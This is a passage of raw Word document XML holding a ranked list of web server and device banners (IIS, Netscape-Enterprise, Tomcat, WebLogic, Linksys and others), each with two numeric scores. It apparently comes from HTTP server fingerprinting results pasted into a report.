          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Netscape-Enterprise/3.6 SP2: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>49  3.46</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="186E316D" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MikroTik</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>RouterOS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>49  3.46</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="566AD5ED" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">IDS-Server/3.2.2: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>49  3.46</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="5B9DBFD6" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Boa/0.94.11: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>49  3.46</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="4DD54D4F" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">JC-HTTPD/1.14.18: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>49  3.46</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0B039E01" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Microsoft-IIS/4.0: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>48  3.07</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="24D138B9" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Microsoft-IIS/5.0: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>48  3.07</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0979D911" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Surgemail</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> webmail (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>DManager</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">): </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>48  3.07</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="22891C12" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Stronghold/2.4.2-Apache/1.3.x: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>47  2.71</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0106AF8A" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Netscape-Enterprise/4.1: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>46  2.37</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="7889022B" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Lotus-Domino/6.x: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>46  2.37</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="3B251EF0" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>HP-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>ChaiServer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/3.0: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>46  2.37</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="1A20B12F" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Apache-Tomcat/4.1.29: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>46  2.37</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="733A234D" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Netscape-Enterprise/3.5.1G: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>45  2.06</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="186928E7" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Ipswitch-IMail</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/8.12: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>45  2.06</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="1552D700" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">cisco-IOS: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>44  1.76</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="260ECD81" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Stronghold/4.0-Apache/1.3.x: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>42  1.23</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="20EE91AD" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>BaseHTTP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/0.3 Python/2p3.3 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>edna</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/0.4: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>42  1.23</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="7B575C15" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Xerver_v3: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>41  0.99</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="61748158" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">NetWare-Enterprise-Web-Server/5.1: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>24  0.70</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="4D930694" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">WebLogic Server 8.x: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>24  0.70</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="1C702E0A" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">WebLogic Server 8.1: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>24  0.70</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="16A2FA0C" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>CompaqHTTPServer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/4.2: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>23  0.70</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="055F4B9F" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Zope</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/2.6.0 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>ZServer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/1.1b1: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>23  0.70</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="33E4BB26" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">squid/2.5.STABLE5: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>23  0.70</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="68EC76F8" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>AkamaiGHost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>25  0.70</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="529D03F3" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Jetty/4.2.2: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>22  0.69</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="6CAD64C8" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Zeus/4.1: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>21  0.68</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="53002EE3" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Microsoft-IIS/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>URLScan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>21  0.68</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="49139966" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Netscape-Enterprise/3.6: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>20  0.66</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0FF0BD38" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>fnord</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>20  0.66</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2197B4AF" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MiniServ</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/0.01: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>20  0.66</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="53FB5EE9" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Tcl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">-Webserver/3.4.2: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>20  0.66</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="6D74F977" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Linksys AP2: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>27  0.66</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="3B934EDB" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Linksys with Talisman firmware: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>27  0.66</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="1D44EE85" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Resin/3.0.8: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>19  0.63</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="787F1850" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Zeus/4_2: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>28  0.62</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="3ED4B783" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>AssureLogic</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/2.0: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>28  0.62</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0190FF93" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Hewlett Packard </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>xjet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
